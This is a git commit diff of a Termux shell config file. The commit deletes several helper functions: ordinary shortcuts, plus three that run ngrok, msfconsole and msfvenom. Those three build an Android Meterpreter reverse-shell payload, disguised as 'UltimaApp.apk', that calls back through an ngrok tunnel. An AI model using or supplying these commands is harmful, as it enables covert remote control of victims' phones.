eee261d4f913ab571fe87d1b47bdf59664df6a53
Said <47763265+SaidGR@users.noreply.github.com>
2020-01-09 22:08:07 -0600

    Update .exc.sh

--- .exc.sh
+++ .exc.sh
@@ -4,58 +4,6 @@ if [ -x /data/data/com.termux/files/usr/libexec/termux/command-not-found ]; then
         }
 fi
 
-
-
-function dw {
-cd /sdcard/download
-ls
-}
-
-
-function bit {
-termux-open https://bitly.com
-}
-
-
-function ingo {
-chmod 777 $2
-if [ $1 = "./" ];then
-./$2
-else
-$1 $2
-fi
-}
-
-
-function ip {
-ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
-printf "$ip" 
-} 
-
-
-function up {
-pkg update -y
-pkg upgrade -y
-}
-
-
-function sess1 {
-ngrok tcp 5555
-}
-function sess2 {
-msfconsole -q -r $PREFIX/lib/config-base
-}
-function sess3 {
-read -p "puerto: " puerto
-msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$puerto R > /sdcard/download/UltimaApp.apk
-} 
-
-
-
-ip=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
-
-dw="/sdcard/download"
-
 cd
 cd SG
 cd .up
